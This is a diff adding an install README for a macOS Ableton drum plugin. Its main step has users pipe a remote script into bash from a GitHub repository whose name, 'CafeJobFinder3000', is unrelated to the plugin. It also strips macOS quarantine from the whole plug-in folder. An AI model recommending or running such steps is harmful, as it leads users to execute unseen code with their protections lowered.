@@ -1,0 +1,19 @@
+DRUM REPLACER for Ableton Live (Mac)
+====================================
+
+Easiest (installs AND keeps it up to date automatically):
+  Open Terminal, paste this line and press Return:
+
+  curl -fsSL https://github.com/dylancleverdon/CafeJobFinder3000/releases/download/drum-replacer/drum-replacer-mac.sh | bash
+
+  You can do this instead of using the files in this zip.
+
+By hand (no automatic updates):
+  1. Copy "Drum Replacer.vst3" to  ~/Library/Audio/Plug-Ins/VST3
+     and "Drum Replacer.component" to  ~/Library/Audio/Plug-Ins/Components
+     (In Finder: Go > Go to Folder..., paste the path.)
+  2. In Terminal, run:  xattr -dr com.apple.quarantine ~/Library/Audio/Plug-Ins
+     (macOS blocks plugins downloaded with a browser until you do this.)
+
+Then in Ableton: Settings (or Preferences) > Plug-Ins > turn on "Use VST3 Plug-in System Folders"
+(or "Use Audio Units") and click Rescan. Search the browser for "Drum Replacer".
